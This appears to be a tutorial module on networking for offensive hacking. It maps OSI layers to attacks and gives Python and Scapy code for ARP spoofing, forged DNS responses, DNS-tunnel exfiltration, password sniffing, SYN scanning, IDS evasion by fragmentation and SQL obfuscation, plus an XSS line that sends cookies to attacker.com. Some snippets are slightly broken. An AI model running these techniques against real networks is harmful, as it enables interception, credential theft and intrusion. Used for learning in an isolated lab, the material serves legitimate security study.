# Module 2: Networking Fundamentals for Hacking

## 2.1 OSI Model & Attack Layers

### Why OSI Matters
Every hack exploits a specific layer:

```
Layer 7: Application    → Web apps, DNS, FTP (SQLi, XSS, DDoS)
Layer 6: Presentation   → Encryption, compression (SSL/TLS attacks)
Layer 5: Session        → Connection management (session hijacking)
Layer 4: Transport      → TCP/UDP (DoS, port scanning)
Layer 3: Network        → IP routing (MITM, ARP spoofing)
Layer 2: Data Link      → MAC addresses (ARP attacks)
Layer 1: Physical       → Cables, WiFi (packet sniffing)
```

```python
# Map of attack types
attacks = {
    "Physical": ["WiFi jamming", "Cable cutting"],
    "Data Link": ["ARP spoofing", "MAC flooding"],
    "Network": ["IP spoofing", "ICMP tunneling"],
    "Transport": ["Port scanning", "SYN flood"],
    "Session": ["Session hijacking", "Fixation"],
    "Presentation": ["SSL strip", "Downgrade attack"],
    "Application": ["SQLi", "XSS", "RCE"]
}
```

---

## 2.2 TCP/IP Stack Deep Dive

### TCP Three-Way Handshake

```python
import socket
import struct
import textwrap

# TCP packet structure (simplified)
class TCPPacket:
    def __init__(self):
        self.src_ip = ""
        self.dst_ip = ""
        self.src_port = 0
        self.dst_port = 0
        self.seq_num = 0
        self.ack_num = 0
        self.flags = 0
        self.window_size = 0

# TCP Handshake Process
"""
1. Client sends SYN (seq=X)
   Flags: SYN bit set
   
2. Server responds with SYN-ACK (seq=Y, ack=X+1)
   Flags: SYN, ACK bits set
   
3. Client sends ACK (seq=X+1, ack=Y+1)
   Flags: ACK bit set
   
Connection established!
"""

def perform_tcp_handshake(host, port, timeout=5):
    """
    Manual TCP connection with handshake visibility
    """
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(timeout)
    
    print(f"[*] Initiating TCP handshake with {host}:{port}")
    
    try:
        # This triggers the handshake internally
        sock.connect((host, port))
        print("[+] Connection successful!")
        
        # Get connection info
        local_addr = sock.getsockname()
        remote_addr = sock.getpeername()
        print(f"[*] Local: {local_addr}, Remote: {remote_addr}")
        
        return True
    except Exception as e:
        print(f"[-] Connection failed: {e}")
        return False
    finally:
        sock.close()

# Why handsshake matters:
# SYN flood: Send lots of SYN packets without completing handshake
# Seq number prediction: Predict seq numbers to spoof connections
# Window size abuse: Use window size info for fingerprinting
```

### IP Protocol & Fragmentation

```python
# IP Header Structure (20 bytes minimum)
def ip_header_info(ip_packet):
    """
    Parse IP header to extract information
    """
    version = ip_packet[0] >> 4
    ihl = (ip_packet[0] & 0x0f) * 4  # Header length
    ttl = ip_packet[8]
    protocol = ip_packet[9]  # 6=TCP, 17=UDP, 1=ICMP
    src_ip = '.'.join(map(str, ip_packet[12:16]))
    dst_ip = '.'.join(map(str, ip_packet[16:20]))
    
    return {
        'version': version,
        'header_length': ihl,
        'ttl': ttl,
        'protocol': protocol,
        'src_ip': src_ip,
        'dst_ip': dst_ip
    }

# IP Fragmentation Attack
def create_fragmented_packets(payload, mtu=500):
    """
    Fragment payload into IP packets
    Smaller MTU = more fragments = detection evasion
    """
    fragments = []
    offset = 0
    
    for i in range(0, len(payload), mtu):
        fragment = payload[i:i+mtu]
        fragments.append({
            'data': fragment,
            'offset': offset // 8,  # In 8-byte units
            'more_fragments': i + mtu < len(payload)
        })
        offset += len(fragment)
    
    return fragments

# TTL (Time To Live) for reconnaissance
def traceroute_analysis(host):
    """
    TTL determines how many hops packet can travel
    Used in traceroute to discover network topology
    """
    for ttl in range(1, 30):
        sock = socket.socket(socket.AF_INET, socket.SOCK_ICMP)
        sock.setsockopt(socket.IPPROTO_IP, socket.IP_TTL, ttl)
        sock.settimeout(2)
        
        try:
            sock.connect((host, 80))
            print(f"TTL {ttl}: Reached destination")
            break
        except socket.timeout:
            print(f"TTL {ttl}: Timeout (intermediate router)")
        except:
            pass
        finally:
            sock.close()
```

---

## 2.3 Common Network Protocols

### DNS (Domain Name System) - Layer 7

```python
import socket

def dns_enum(domain):
    """
    DNS enumeration reveals server locations
    """
    try:
        ip = socket.gethostbyname(domain)
        print(f"[+] {domain} -> {ip}")
        
        # Get all records
        info = socket.getaddrinfo(domain, 80)
        for record in info:
            print(f"    {record}")
    except socket.gaierror:
        print(f"[-] Could not resolve {domain}")

def reverse_dns_lookup(ip):
    """
    Reverse DNS: IP -> domain name
    """
    try:
        hostname, _, _ = socket.gethostbyaddr(ip)
        print(f"[+] {ip} -> {hostname}")
    except:
        print(f"[-] No reverse DNS for {ip}")

# DNS Spoofing Attack
def dns_spoof_attack():
    """
    DNS poisoning allows MITM attacks
    Attacker intercepts DNS queries and returns malicious IPs
    """
    # This requires DNS server interception (local network)
    # Common tool: dnsspoof, arpspoof
    pass

# DNS Exfiltration
def dns_exfiltrate_data(data, attacker_ns):
    """
    DNS tunneling: Send data through DNS queries
    Bypasses firewall since DNS is usually allowed
    """
    # Convert data to domain names
    # Query attacker's DNS server with encoded data
    for chunk in [data[i:i+32] for i in range(0, len(data), 32)]:
        encoded = chunk.hex()
        subdomain = f"{encoded}.{attacker_ns}"
        # This would trigger a DNS query
        print(f"Sending: {subdomain}")
```

### HTTP & HTTPS - Layer 7

```python
import hashlib
import hmac

def http_protocol_basics():
    """
    HTTP is stateless, sends data in plaintext
    """
    http_request = b"""GET /index.html HTTP/1.1\r
Host: example.com\r
User-Agent: Mozilla/5.0\r
Connection: close\r
\r
"""
    # This entire request is visible to MITM attackers
    pass

def https_tls_handshake():
    """
    TLS adds encryption but has several attack vectors:
    1. SSL Downgrade: Force HTTP instead of HTTPS
    2. Certificate Validation Bypass: MITM with fake cert
    3. Early TLS: Sends SNI in plaintext
    """
    pass

# HTTP Header Injection
def http_header_injection_example(user_input):
    """
    VULNERABLE: If headers not sanitized
    Attacker can inject \r\n to add headers
    """
    # If user_input = "Mozilla\r\nSet-Cookie: admin=true"
    # Results in:
    # User-Agent: Mozilla
    # Set-Cookie: admin=true
    pass

# Cookie Stealing
def steal_session_cookie():
    """
    JavaScript can access cookies without HttpOnly flag
    <img src=x onerror="fetch('attacker.com?c='+document.cookie)">
    """
    pass
```

### ICMP (Internet Control Message Protocol)

```python
def icmp_ping_analysis():
    """
    ICMP used for ping and traceroute
    Can be abused for reconnaissance and tunneling
    """
    # Echo Request (Type 8) -> Echo Reply (Type 0)
    # Timestamp Request (Type 13) -> Timestamp Reply (Type 14)
    
    # ICMP Tunneling: Send data inside ICMP packets
    # Firewall sees only "pings", not actual payload
    pass

def detect_os_via_icmp(host):
    """
    OS fingerprinting via ICMP TTL values:
    - Windows: TTL 128
    - Linux: TTL 64
    - macOS: TTL 64
    """
    pass
```

---

## 2.4 Scapy: Packet Crafting Framework

### What is Scapy?
- **Raw packet creation and manipulation**
- **Send/receive packets at Layer 2 (MAC) and Layer 3 (IP)**
- **Industry standard for network hacking**

```python
# Installation: pip install scapy

from scapy.all import *

# Creating custom packets
def craft_tcp_syn():
    """
    Create SYN packet for port scanning
    """
    ip_layer = IP(dst="example.com")
    tcp_layer = TCP(dport=80, flags="S")  # S = SYN flag
    packet = ip_layer/tcp_layer
    
    # Send packet
    send(packet)

def arp_spoofing_demo():
    """
    ARP Spoofing: Tell network "I'm the gateway"
    Allows MITM attacks
    """
    # Create ARP packet claiming we're 192.168.1.1 but have our MAC
    arp_request = ARP(op="is-at",
                      pdst="192.168.1.100",  # Target
                      psrc="192.168.1.1")    # Spoofed IP
    
    # Send in loop for continuous spoofing
    for _ in range(100):
        send(arp_request, verbose=False)

def craft_malicious_dns_response():
    """
    Create DNS response pointing to attacker's IP
    Used in DNS spoofing
    """
    dns_response = IP(dst="192.168.1.100")/\
                   UDP(dport=53)/\
                   DNS(id=12345, qr=1, aa=1,
                       qdcount=1, ancount=1,
                       qd=DNSQR(qname="example.com"),
                       an=DNSRR(rnname="example.com",
                                rdata="1.1.1.1"))
    
    send(dns_response)

def packet_capture_and_analyze():
    """
    Capture and analyze network traffic
    """
    def packet_handler(packet):
        if TCP in packet:
            src_ip = packet[IP].src
            dst_ip = packet[IP].dst
            src_port = packet[TCP].sport
            dst_port = packet[TCP].dport
            flags = packet[TCP].flags
            
            print(f"TCP: {src_ip}:{src_port} -> {dst_ip}:{dst_port} [Flags: {flags}]")
            
            # Look for credentials in payload
            if Raw in packet:
                payload = packet[Raw].load
                if b"password" in payload.lower():
                    print(f"[!!!] Found password reference: {payload[:100]}")
    
    # Capture packets on network interface
    # sniff(prn=packet_handler, filter="tcp", count=100)
```

---

## 2.5 Network Reconnaissance Tools in Python

### Passive Information Gathering

```python
import socket
import struct

def whois_lookup(domain):
    """
    WHOIS: Get domain registration info
    """
    # Using external API (since WHOIS is TCP-based)
    import urllib.request
    try:
        response = urllib.request.urlopen(f"https://www.whois.com/whois/{domain}")
        print(response.read().decode()[:1000])
    except:
        print("WHOIS lookup failed")

def get_mx_records(domain):
    """
    MX Records: Mail server locations
    """
    try:
        import dns.resolver
        answers = dns.resolver.resolve(domain, 'MX')
        for answer in answers:
            print(f"Mail server: {answer.exchange} (Priority: {answer.preference})")
    except:
        print("DNS resolution failed")

def enumerate_subdomains(domain, wordlist):
    """
    Subdomain enumeration: Find hidden subdomains
    """
    for subdomain in wordlist:
        try:
            ip = socket.gethostbyname(f"{subdomain}.{domain}")
            print(f"[+] {subdomain}.{domain} -> {ip}")
        except socket.gaierror:
            pass

def zone_transfer_attempt(domain):
    """
    DNS Zone Transfer: Try to get all DNS records
    If allowed, reveals entire network structure
    """
    try:
        import dns.zone
        zone = dns.zone.from_xfr(dns.query.xfr(domain, '8.8.8.8'))
        for name, node in zone.items():
            print(f"{name}: {node}")
    except Exception as e:
        print(f"Zone transfer failed: {e}")
```

### Active Reconnaissance

```python
def syn_port_scanner(host, ports):
    """
    SYN port scanner using raw packets
    Faster than TCP connect() as it doesn't complete handshake
    """
    from scapy.all import IP, TCP, send, conf
    
    conf.verb = 0  # Suppress output
    
    for port in ports:
        packet = IP(dst=host)/TCP(dport=port, flags="S")
        send(packet, verbose=False)
        # Would need ICMP handler to see responses

def service_version_detection(host, port):
    """
    Banner grabbing: Get service version info
    """
    try:
        sock = socket.socket()
        sock.settimeout(3)
        sock.connect((host, port))
        
        # Many services send banner immediately
        banner = sock.recv(1024).decode('utf-8', errors='ignore')
        print(f"[+] {host}:{port} -> {banner[:100]}")
        
        sock.close()
    except Exception as e:
        print(f"[-] Port {port}: {e}")
```

---

## 2.6 Network Security Evasion

### IDS/Firewall Evasion Techniques

```python
def fragment_for_evasion():
    """
    Fragment packets smaller than IDS inspection buffer
    IDS might miss malicious pattern split across fragments
    """
    from scapy.all import IP, TCP
    
    # Normal: One packet with suspicious payload
    # Evasion: Split across multiple fragments
    malicious_data = b"....SUSPICIOUS_PAYLOAD..."
    
    fragments = []
    for i in range(0, len(malicious_data), 8):
        chunk = malicious_data[i:i+8]
        pkt = IP(dst="target.com", flags="MF" if i + 8 < len(malicious_data) else 0,
                 frag=i//8) / Raw(load=chunk)
        fragments.append(pkt)
    
    # IDS might not reassemble properly
    return fragments

def polymorphic_payload():
    """
    Change packet characteristics to evade signatures
    """
    techniques = [
        "Randomize packet order",
        "Add random delays between packets",
        "Use different TTL values",
        "Randomize source port",
        "Vary packet size",
        "Use different TCP flags"
    ]

def obfuscate_pattern():
    """
    Encode suspicious strings to evade IDS regex
    """
    suspicious = "SELECT * FROM users"
    
    # Method 1: URL encoding
    encoded1 = "%53%45%4C%45%43%54%20*%20FROM%20users"
    
    # Method 2: Base64
    encoded2 = b"U0VMRUNUICogRlJPTSB1c2Vycw==".decode()
    
    # Method 3: Comment insertion
    encoded3 = "SEL/**/ECT * FROM users"
    
    # Method 4: Hex encoding
    encoded4 = "0x53454c454354202a2046524f4d207573657273"
    
    # All execute the same SQL command
```

---

## 2.7 Practice Lab: Build a Network Scanner

```python
import socket
import threading
import time
from queue import Queue

class NetworkScanner:
    def __init__(self, host, ports):
        self.host = host
        self.ports = ports
        self.queue = Queue()
        self.open_ports = []
    
    def scan_port(self, port):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(1)
            result = sock.connect_ex((self.host, port))
            
            if result == 0:
                self.open_ports.append(port)
                print(f"[+] Port {port}: OPEN")
            
            sock.close()
        except Exception as e:
            pass
    
    def threaded_scan(self, num_threads=50):
        # Create threads
        thread_list = []
        
        for port in self.ports:
            t = threading.Thread(target=self.scan_port, args=(port,))
            thread_list.append(t)
            t.start()
            
            # Limit concurrent threads
            if len(thread_list) == num_threads:
                for thread in thread_list:
                    thread.join()
                thread_list = []
        
        # Wait for remaining threads
        for thread in thread_list:
            thread.join()
        
        return self.open_ports

# Usage:
# scanner = NetworkScanner("192.168.1.100", range(1, 1001))
# open_ports = scanner.threaded_scan()
# print(f"Open ports: {open_ports}")
```

---

## Summary
- OSI model shows where different attacks occur
- TCP/IP stack has vulnerabilities at each layer
- Scapy enables raw packet manipulation
- DNS reveals network structure
- Reconnaissance is the foundation of all attacks
- Evasion techniques bypass security controls

## Next Steps
- Set up Wireshark to capture traffic
- Practice with Scapy in isolated lab
- Study real pcap files
- Learn IDS/firewall bypassing techniques
